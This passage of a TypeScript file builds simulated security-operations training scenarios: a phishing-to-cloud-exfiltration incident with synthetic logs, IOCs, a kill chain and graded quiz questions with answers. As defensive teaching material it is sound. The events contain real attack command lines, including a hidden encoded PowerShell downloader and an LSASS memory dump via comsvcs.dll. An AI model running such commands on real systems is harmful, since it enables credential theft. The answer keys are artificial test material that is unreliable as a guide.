        "process.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAG4AZQB3AC4tV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZw==",
        "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        // User
        "user.name": "CRYOTECH\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.47",
        "host.os.name": "Windows 10 Pro",
        "host.os.version": "22H2",
        "host.os.build": "19045.4291",
        // ML risk score
        // Threat mapping
        "threat.category": "Dropper",
      },
    },
    {
      id: "evt_07_reg_persist", ts: T(8 * MIN + 20_000),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1547.001",
      description: "PowerShell set an HKCU Run value named WindowsUpdater on WS-FIN-2847 that launches rundll32.exe against svchost32.dll.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:50:20.118",
        "winlog.event_data.EventType": "SetValue",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "5512",
        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.TargetObject": "HKU\\S-1-5-21-3421479547-3897544621-1789562108-1103\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
        "winlog.event_data.Details": "rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll,DllMain",
        "winlog.event_data.User": "CRYOTECH\\jsmith",
      },
    },
    {
      id: "evt_08_dns_tunnel", ts: T(17 * MIN),
      source: "dns", vendor: "Infoblox DNS", event_type: "dns_query",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1071.004",
      network: { domain: c2Domain },
      description: `WS-FIN-2847 sent a DNS TXT query for a long random subdomain of ${c2Domain} and received a Base64-encoded answer.`,
      raw: {
        "event.action": "dns_query",
        "infoblox.query_name": "dh7k2nq3x1vc9ab4fzrp.c2-cdn-update-fb76.xyz",
        "infoblox.query_type": "TXT",
        "infoblox.response_code": "NOERROR",
        "infoblox.rpz_policy": "PASSTHRU",
        "infoblox.answer": "cmVjdiA0NzUgYnl0ZXMgZGF0YQ==",
        "dns.question.name": "dh7k2nq3x1vc9ab4fzrp.c2-cdn-update-fb76.xyz",
        "dns.question.type": "TXT",
        "dns.response_code": "NOERROR",
        "source.ip": "10.10.20.47", "host.name": "WS-FIN-2847",
        "network.protocol": "dns",
      },
    },
    // Privilege escalation. The dump below opens lsass.exe with PROCESS_ALL_ACCESS,
    // which needs SeDebugPrivilege — a medium-integrity token does not have it.
    // The beacon has to elevate first, and doing so leaves its own trail.
    {
      id: "evt_08b_uac_bypass", ts: T(22 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1548.002",
      process: {
        name: "computerdefaults.exe", pid: 5980, parent_name: "powershell.exe", parent_pid: 5512,
        cmdline: "computerdefaults.exe",
        user: "CRYOTECH\\jsmith", integrity: "high",
      },
      description: "computerdefaults.exe started at High integrity with the beacon's PowerShell process as its parent, and no consent prompt was recorded.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.ProcessId": "5980",
        "winlog.event_data.Image": "C:\\Windows\\System32\\computerdefaults.exe",
        "winlog.event_data.CommandLine": "computerdefaults.exe",
        "winlog.event_data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.ParentProcessId": "5512",
        "winlog.event_data.User": "CRYOTECH\\jsmith",
        "winlog.event_data.IntegrityLevel": "High",
        "winlog.event_data.Company": "Microsoft Corporation",
      },
    },
    {
      id: "evt_09_lsass", ts: T(23 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1003.001",
      process: {
        name: "rundll32.exe", pid: 6244, parent_name: "computerdefaults.exe", parent_pid: 5980,
        cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin full",
        user: "CRYOTECH\\jsmith", integrity: "high",
      },
      file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin" },
      description: "CrowdStrike detected rundll32.exe on WS-FIN-2847 using comsvcs.dll MiniDump to write lsass.exe memory to debug.bin.",
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simplename": "CredentialDumpingTool",
        "crowdstrike.detection.id": "ldt:c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6:1234567893",
        "crowdstrike.detection.description": "rundll32.exe invoked comsvcs.dll MiniDump to dump LSASS memory (PID 704) to C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin. PROCESS_ALL_ACCESS (0x1FFFFF) was requested against lsass.exe. NTLM hashes and Kerberos tickets at risk.",
        "crowdstrike.detection.scenario": "lsass_memory_dump_via_comsvcs",
        "crowdstrike.detection.tactic": "Credential Access",
        "crowdstrike.detection.tactic_id": "TA0006",
        "crowdstrike.detection.technique": "OS Credential Dumping: LSASS Memory",
        "crowdstrike.detection.technique_id": "T1003.001",
        "crowdstrike.detection.pattern_id": "30732",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Gather Credentials",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.behaviors": "MiniDumpWriteDump API called against lsass.exe|comsvcs.dll loaded as LOLBAS into rundll32.exe|LSASS dump written to non-standard user path (%TEMP%)|PROCESS_ALL_ACCESS (0x1FFFFF) requested against lsass.exe",
        "crowdstrike.sensor.id": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
        "crowdstrike.customer_id": "3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b",
        "crowdstrike.sensor.version": "7.08.17410.0",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.tree_id": "b4c5d6e7f8a1b2c3d4e5f6a7b8c9d0e1",
        "crowdstrike.call_stack_module_names": "ntdll.dll|KERNELBASE.dll|kernel32.dll|comsvcs.dll|rundll32.exe",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6/1234567893",
        // Event
        "event.action": "process_created",
        "event.created": "2026-05-08T10:05:00.000Z",
        // Process — rundll32.exe (the credential dumper)
        "process.pid": "6244",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe",
        "process.name": "rundll32.exe",
        "process.command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin full",
        "process.hash.sha256": "b5d4c3e2f1a0b5d4c3e2f1a0b5d4c3e2f1a0b5d4c3e2f1a0b5d4c3e2f1a0b5d4",
        "process.hash.md5": "3d87df5ec4b33f7f41e53a14b5d4c3e2",
        "process.integrity_level": "HIGH_INTEGRITY_LEVEL",
        "process.token_type": "TokenPrimary",
        "process.session_id": "1",
        // Parent — powershell.exe
        "process.parent.pid": "5512",
        "process.parent.name": "powershell.exe",
        "process.parent.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.parent.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAG4AZQB3AC4tV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZw==",
        "process.parent.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        // Grandparent — WINWORD.EXE
        "process.grandparent.name": "WINWORD.EXE",
        "process.grandparent.pid": "4128",
        "process.grandparent.executable": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        // Target process — lsass.exe (the victim of the memory dump)
        "process.target.name": "lsass.exe",
        "process.target.pid": "704",
        "process.target.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe",
        "process.target.access_rights": "0x1FFFFF",
        "process.target.access_rights_description": "PROCESS_ALL_ACCESS",
        // LOLBAS — comsvcs.dll
        "lolbas.name": "comsvcs.dll",
        "lolbas.function": "MiniDump",
        "lolbas.signed": "true",
        "lolbas.vendor": "Microsoft Corporation",
        "lolbas.description": "Windows COM+ Services DLL — MiniDump export abused to dump LSASS without external tools",
        // Output file (the credential dump)
        "file.name": "debug.bin",
        "file.path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\debug.bin",
        "file.size": "58720256",
        "file.created": "2026-05-08T10:05:01.231Z",
        "file.type": "memory_dump",
        // User
        "user.name": "CRYOTECH\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.47",
        "host.mac": "00-0C-29-AB-CD-EF",
        "host.os.name": "Windows 10 Pro",
        "host.os.version": "22H2",
        "host.os.build": "19045.4291",
        // Threat mapping
      },
    },
    {
      id: "evt_09b_kerberos_tgt", ts: T(24 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
      hostname: "DC01", user_email: victim.email,
      // T1550.002 Pass the Hash. A 4768 requesting a TGT with RC4 immediately
      // after an LSASS dump is the overpass-the-hash signature: the attacker
      // holds the NTLM hash, not the password, so pre-authentication is built
      // with the RC4 key derived from that hash. It was mapped T1558.003
      // (Kerberoasting), which is a 4769 TGS request against an SPN account
      // cracked offline — a different event id, a different direction, and it
      // requires a valid account to begin with.
      severity: "high", mitre_technique: "T1550.002",
      description: `A Kerberos TGT for jsmith was requested from WS-FIN-2847 using RC4 encryption (0x17).`,
      raw: {
        "event.code": "4768",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.TargetUserName": victim.email.split("@")[0],
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-502",
        "winlog.event_data.TicketOptions": "0x40810010",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IPAddress": victim.ip ?? "10.0.1.52",
        "winlog.event_data.IPPort": "54802",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "2",
      },
    },
    {
      id: "evt_09c_network_logon", ts: T(25 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "FS-CORP-01", user_email: victim.email,
      severity: "high", mitre_technique: "T1078",
      description: "jsmith authenticated to FS-CORP-01 via a Kerberos network logon (Type 3) sourced from WS-FIN-2847.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.TargetUserName": victim.email.split("@")[0],
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.LogonProcessName": "Kerberos",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": victim.hostname,
        "winlog.event_data.IpAddress": victim.ip ?? "10.0.1.52",
        "winlog.event_data.IpPort": "54803",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.KeyLength": "0",
      },
    },
    {
      id: "evt_10_foreign_auth", ts: T(35 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "auth_success",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1078",
      description: `j.smith's Microsoft 365 account signed in from Amsterdam, Netherlands (${attackerIp}); Entra ID Identity Protection rated the sign-in High Risk.`,
      raw: {
        // Azure AD / Entra ID Sign-In Log
        "azure.signinlogs.correlation_id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "azure.signinlogs.result_type": "0",
        "azure.signinlogs.result_description": "Successfully signed in",
        "azure.signinlogs.app_id": "00000002-0000-0ff1-ce00-000000000000",
        "azure.signinlogs.app_display_name": "Office 365 Exchange Online",
        "azure.signinlogs.resource_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_detail": "userPassedMFADrivenByRiskBasedPolicy",
        "azure.signinlogs.risk_level_aggregated": "high",
        "azure.signinlogs.risk_level_during_signin": "high",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_id": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "azure.signinlogs.user_principal_name": "j.smith@cryotech.com",
        "azure.signinlogs.user_display_name": "James Smith",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.device_detail.browser": "python-requests/2.28.0",
        "azure.signinlogs.device_detail.operating_system": "Linux",
        "azure.signinlogs.device_detail.device_id": "(not registered)",
        "azure.signinlogs.device_detail.is_compliant": "false",
        "azure.signinlogs.device_detail.is_managed": "false",
        "azure.signinlogs.location.city": "Amsterdam",
        "azure.signinlogs.location.country_or_region": "NL",
        "azure.signinlogs.location.geo_coordinates.latitude": "52.3702",
        "azure.signinlogs.location.geo_coordinates.longitude": "4.8952",
        "azure.signinlogs.mfa_detail.auth_method": "Session token replay (no interactive MFA prompt)",
        "azure.signinlogs.mfa_detail.auth_detail": "MFA claim present in replayed token — method inconsistent with registered device",
        "azure.signinlogs.authentication_details": "1st factor: password (success, from LSASS-dumped credential material)|2nd factor: MFA claim satisfied via stolen session token|First sign-in from Netherlands|No CA policy matched|Entra ID P2 risk-based CA not licensed",
        // ECS fields
        "event.action": "UserLoggedIn",
        "event.outcome": "success",
        "event.created": "2026-05-08T10:17:00.000Z",
        "user.email": "j.smith@cryotech.com",
        "source.ip": "91.108.56.122",
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "user_agent.original": "python-requests/2.28.0",
        "authentication.status": "success",
        "authentication.method": "Password + token replay",
        "authentication.mfa": "token_replay",
        "risk.level": "High",
      },
    },
    {
      id: "evt_11_inbox_rule", ts: T(38 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1564.008",
      description: `A new inbox rule was created in j.smith's mailbox from ${attackerIp}: any email containing wire, invoice, or payment is moved to RSS Feeds and marked as read.`,
      raw: {
        // O365 Unified Audit Log — New-InboxRule
        "data.office365.Id": "a1b2c3d4-e5f6-7a8b-9c0d-e1f2a3b4c5d6",
        "data.office365.RecordType": "1",
        "data.office365.RecordType_description": "ExchangeAdmin",
        "data.office365.CreationTime": "2026-05-08T10:20:00Z",
        "data.office365.Operation": "New-InboxRule",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "j.smith@cryotech.com",
        "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "data.office365.UserType": "0",
        "data.office365.UserType_description": "Regular",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.ExternalAccess": "false",
        // Exchange rule detail fields
        "exchange.cmdlet.name": "New-InboxRule",
        "exchange.rule.name": "․․",
        "exchange.rule.condition.body_or_subject_contains": "wire, invoice, payment, banking",
        "exchange.rule.action.move_to_folder": "RSS Feeds",
        "exchange.rule.action.mark_as_read": "true",
        "exchange.rule.action.stop_processing_rules": "false",
        // ECS fields
        "event.action": "New-InboxRule",
        "event.outcome": "success",
        "user.email": "j.smith@cryotech.com",
        "source.ip": attackerIp,
      },
    },
    {
      id: "evt_12_s3_exfil", ts: T(43 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1567.002",
      network: { bytes_out: 184_000_000 },
      description: `j.smith's AWS credentials downloaded a 184MB customer financial archive from S3 from ${attackerIp} (Netherlands).`,
      raw: {
        "event.action": "GetObject", "event.outcome": "success",
        "aws.cloudtrail.event_name": "GetObject",
        "aws.cloudtrail.event_source": "s3.amazonaws.com",
        "aws.s3.bucket.name": "cryotech-crm-exports",
        "storage.object.name": "exports/customer-financial-data-2026.zip",
        "network.bytes_out": "184000000",
        "cloud.provider": "aws", "cloud.region": "us-east-1",
        "source.ip": attackerIp,
        "user.name": "jsmith",
        "user_agent.original": "aws-cli/2.13.0",
        "alert.name": "UnauthorizedAccess:IAMUser/AnomalousBehavior",
      },
    },

    // ── CORRELATED: Baseline — j.smith normal morning Okta login from Israel ─────
    {
      id: "evt_phish_baseline_01", ts: T(-30 * MIN),
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email,
      src_ip: "185.64.44.22",
      description: "j.smith logged in to Okta from Tel Aviv on a registered device.",
      raw: {
        "okta.event_type": "user.session.start",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.login": victim.email,
        "okta.client.ip_address": "185.64.44.22",
        "okta.client.geographic_context.country": "IL",
        "okta.client.geographic_context.city": "Tel Aviv",
        "okta.authentication_context.auth_type": "PASSWORD_IDP",
        "okta.risk.level": "LOW",
        "GeoLocation.country_name": "Israel",
        "GeoLocation.city_name": "Tel Aviv",
        "GeoLocation.location.lat": 32.0853,
        "GeoLocation.location.lon": 34.7818,
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": "185.64.44.22",
        "user.email": victim.email,
      },
    },

    // ── CORRELATED: DNS query for C2 domain just before beacon ────────────────────
    {
      id: "evt_phish_dns_c2", ts: T(5 * MIN + 42_000),
      source: "sysmon", vendor: "Microsoft Sysmon",
      event_type: "dns_query", severity: "high",
      hostname: victim.hostname, src_ip: victim.ip,
      mitre_technique: "T1071.001",
      description: `WS-FIN-2847 resolved ${c2Domain}, a domain registered 3 days ago.`,
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:47:42.203",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "5512",
        "winlog.event_data.QueryName": c2Domain,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": `type: 1 ${c2Ip};`,
        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "host.name": victim.hostname,
      },
    },

    // ── CORRELATED: Firewall event — PowerShell connecting to C2 IP ───────────────
    {
      id: "evt_phish_fw_c2", ts: T(5 * MIN + 46_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1071.001",
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443,
      hostname: victim.hostname,
      description: `WS-FIN-2847 opened an outbound HTTPS connection to ${c2Ip} — the resolved IP for the newly-seen domain.`,
      raw: {
        "event.action": "allow",
        "source.ip": victim.ip,
        "destination.ip": c2Ip,
        "destination.port": "443",
        "pan.app": "ssl",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "threat.category": "CommandAndControl",
        "url.category": "Unknown",
        "network.bytes_out": "1240",
        "network.bytes_in": "4096",
        "action_result": "allow",
      },
    },

    // ── CORRELATED: Outcome — account locked after Netherlands login flagged ──────
    {
      id: "evt_phish_outcome_lock", ts: T(38 * MIN),
      source: "ad", vendor: "Microsoft Entra ID",
      event_type: "account_modify", severity: "medium",
      user_email: victim.email, src_ip: "10.10.1.5",
      description: "Entra ID Identity Protection raised j.smith's account risk level to High.",
      raw: {
        "data.office365.Operation": "Set user risk level",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "it-security@cryotech.com",
        "data.office365.ObjectId": victim.email,
        "data.office365.ResultStatus": "Success",
        "azure.auditlogs.category": "UserManagement",
        "azure.auditlogs.target_user.upn": victim.email,
        "user.risk_level": "High",
        "user.risk_state": "atRisk",
        "security.action": "RiskDetected_FirstTimeCountry",
        "event.action": "SetUserRiskLevel",
        "event.outcome": "success",
        "source.ip": "10.10.1.5",
      },
    },
  ];

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "domain",  value: c2Domain,                        reputation: "malicious",  tags: ["c2", "cobalt-strike"] },
    { type: "ip",      value: c2Ip,                            reputation: "malicious",  tags: ["c2", "cobalt-strike"] },
    { type: "ip",      value: attackerIp,                      reputation: "malicious",  tags: ["attacker", "netherlands"] },
    { type: "ip",      value: "91.108.56.199",                 reputation: "malicious",  tags: ["phishing-sender"] },
    { type: "sha256",  value: dllHash,                         reputation: "malicious",  tags: ["dropper", "dll", "stage1"] },
    { type: "email",   value: "support@cryotech-vendor.xyz",   reputation: "malicious",  tags: ["phishing", "sender"] },
    { type: "url",     value: `https://${c2Domain}/beacon`,    reputation: "malicious",  tags: ["c2", "beacon"] },
    { type: "user",    value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
    { type: "host",    value: victim.hostname,                 reputation: "suspicious", tags: ["patient-zero"] },
  ];

  const killchain = [
    { ts: T(5 * MIN),          phase: "Initial Access",          action: "Phishing email 'Invoice_Q3_Final.docm' delivered — bypassed SPF/DKIM/DMARC via transport rule" },
    { ts: T(5 * MIN + 31_000), phase: "Execution",               action: "WINWORD.EXE macro spawns hidden PowerShell with encoded Cobalt Strike loader" },
    { ts: T(5 * MIN + 45_000), phase: "Command & Control",       action: "Cobalt Strike HTTPS beacon to c2-cdn-update-fb76.xyz every 60s" },
    { ts: T(8 * MIN),          phase: "Persistence",             action: "svchost32.dll dropped to %TEMP%; HKCU Run key 'WindowsUpdater' created" },
    { ts: T(23 * MIN),         phase: "Credential Access",       action: "LSASS dumped via comsvcs.dll MiniDump — domain credentials extracted" },
    { ts: T(35 * MIN),         phase: "Lateral / Identity",      action: "Stolen credentials used to authenticate from Netherlands into Microsoft 365" },
    { ts: T(43 * MIN),         phase: "Exfiltration",            action: "184MB customer financial data exfiltrated from S3 (48,000 customer PII records)" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which MITRE technique best describes the initial access vector used in this attack?", kind: "single",
      options: [
        { value: "T1566.001", label: "T1566.001 — Spearphishing Attachment (.docm macro)" },
        { value: "T1190",     label: "T1190 — Exploit Public-Facing Application" },
        { value: "T1078",     label: "T1078 — Valid Accounts (credential reuse)" },
        { value: "T1133",     label: "T1133 — External Remote Services (VPN)" },
      ],
      answer: "T1566.001", xp: 50,
      explanation: "A macro-enabled Word document (.docm) was delivered via phishing email. When the user enabled macros, Office spawned PowerShell — this is T1566.001 Spearphishing Attachment. The SPF/DKIM/DMARC bypass via transport rule is a delivery bypass, not the technique itself." },
    { id: "q2", prompt: "What is the parent process of the malicious powershell.exe in event evt_04?", kind: "single",
      options: [
        { value: "OUTLOOK.EXE", label: "OUTLOOK.EXE — email client" },
        { value: "WINWORD.EXE", label: "WINWORD.EXE — Microsoft Word" },
        { value: "explorer.exe", label: "explorer.exe — Windows shell" },
        { value: "svchost.exe",  label: "svchost.exe — service host" },
      ],
      answer: "WINWORD.EXE", xp: 50,
      explanation: "WINWORD.EXE spawning powershell.exe is the canonical Office macro execution pattern. A Word process should never legitimately spawn PowerShell — this parent-child relationship alone should trigger an immediate alert." },
    { id: "q3", prompt: "Which TWO artifacts together form the persistence mechanism on WS-FIN-2847?", kind: "multi",
      options: [
        { value: "run_key", label: "HKCU Run key 'WindowsUpdater' → rundll32 + svchost32.dll" },
        { value: "lsass",   label: "LSASS memory dump file (debug.bin)" },
        { value: "dll",     label: "svchost32.dll dropped to C:\\Users\\jsmith\\AppData\\Local\\Temp\\" },
        { value: "inbox",   label: "Hidden inbox rule '..' in j.smith's mailbox" },
      ],
      answer: ["run_key", "dll"], xp: 75,
      explanation: "The DLL is the malicious payload; the Run key is the autorun trigger. Together they ensure the malware survives reboots. The LSASS dump is credential theft, not persistence. The inbox rule is post-compromise collection, not persistence on the endpoint." },
    { id: "q4", prompt: "What single containment action best stops the active threat on WS-FIN-2847 immediately?", kind: "single",
      options: [
        { value: "isolate",  label: "Network-isolate the endpoint via EDR console" },
        { value: "reboot",   label: "Reboot the endpoint to kill the beacon process" },
        { value: "block_ip", label: "Block the C2 IP at the perimeter firewall only" },
        { value: "warn",     label: "Send j.smith a security awareness email" },
      ],
      answer: "isolate", xp: 50,
      explanation: "EDR network isolation severs all connections (C2, lateral) while preserving memory and disk for forensics. Rebooting kills the process but the Run key re-executes it on next logon. Blocking a single IP fails because the attacker can rotate IPs. Email warning doesn't address an active compromise." },
  ];

  return {
    scenario_id: scenarioId,
    title: "Phishing → Cloud Exfiltration",
    threat_actor: "TA-COBALTSPIDER (financially motivated)",
    attack_kind: "phishing_to_exfil",
    briefing: "CrowdStrike raised a high-severity detection on WS-FIN-2847 (j.smith) at 10:00. Twenty minutes later Entra ID Identity Protection flagged the same user's account as High Risk. Both alerts are sitting unassigned in the queue.",
    narrative: `At 09:47, a finance analyst at Cryotech Industries received what appeared to be a routine vendor invoice. The macro-enabled Word attachment bypassed email security via a misconfigured transport rule. Twenty seconds after clicking "Enable Content", Office spawned a hidden PowerShell process loading a Cobalt Strike beacon. Within 90 seconds the host was beaconing to a 3-day-old domain, dropping a DLL into %TEMP%, and writing a Run key for persistence. Eighteen minutes in, LSASS was dumped using a built-in Windows DLL — no external tools. Thirty-five minutes later, the stolen credentials authenticated from the Netherlands, a hidden inbox rule silently rerouted financial emails, and 184MB of customer PII was pulled from S3. Your job: trace the full kill chain, identify the persistence mechanism, and determine what containment actions would have stopped the exfiltration.`,
    learning_objectives: [
      "Identify spearphishing delivery and recognize SPF/DKIM/DMARC bypass techniques",
      "Trace the Office macro → PowerShell → C2 execution chain using process trees",
      "Distinguish endpoint persistence mechanisms (Registry Run keys + DLL drops)",
      "Recognize LSASS credential dumping via Living-off-the-Land (LOLBin) techniques",
      "Correlate endpoint compromise with subsequent identity abuse in cloud services",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 2: Password Spray → BEC Mailbox Rule
// =========================================================================

export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle {
  const B = new Date("2026-05-08T08:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim      = { hostname: "LAPTOP-FIN-04", email: "l.harris@cryotech.com", ip: "10.10.30.21" };
  const attackerIp  = "91.108.56.122";
  const sprayIp     = "158.131.159.30";

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_spray", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
      src_ip: sprayIp,
      severity: "high", mitre_technique: "T1110.003",
      description: `47 failed logins across 14 different Cryotech accounts arrived from the same IP (${sprayIp}) within 4 minutes.`,
      raw: {
        // Windows Security Event 4625 — Failed Logon (representative entry for spray aggregate)
        "winlog.event_id": "4625",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048301",
        // Subject (no authenticated subject for failed logons from external)
        "winlog.event_data.SubjectUserSid": "S-1-0-0",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        // Target (representative account from the spray)
        "winlog.event_data.TargetUserName": "l.harris",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        // Failure reason
        "winlog.event_data.Status": "0xC000006D",
        "winlog.event_data.Status_description": "Unknown user name or bad password",
        "winlog.event_data.SubStatus": "0xC000006A",
        "winlog.event_data.SubStatus_description": "Wrong password",
        "winlog.event_data.FailureReason": "%%2312",
        // Logon details
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.LogonProcessName": "NtLmSsp",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": "-",
        "winlog.event_data.IpAddress": sprayIp,
        "winlog.event_data.IpPort": "49234",
        // ECS fields
        "event.code": "4625",
        "event.action": "logon-failed",
        "event.outcome": "failure",
        "event.created": "2026-05-08T08:00:00.000Z",
        "authentication.status": "failure",
        "authentication.failure_reason": "wrong_password",
        "authentication.protocol": "NTLM",
        "logon.type": "3",
        "source.ip": sprayIp,
        "source.geo.country_name": "Netherlands",
      },
    },
    {
      id: "evt_02_lockout_1", ts: T(1 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
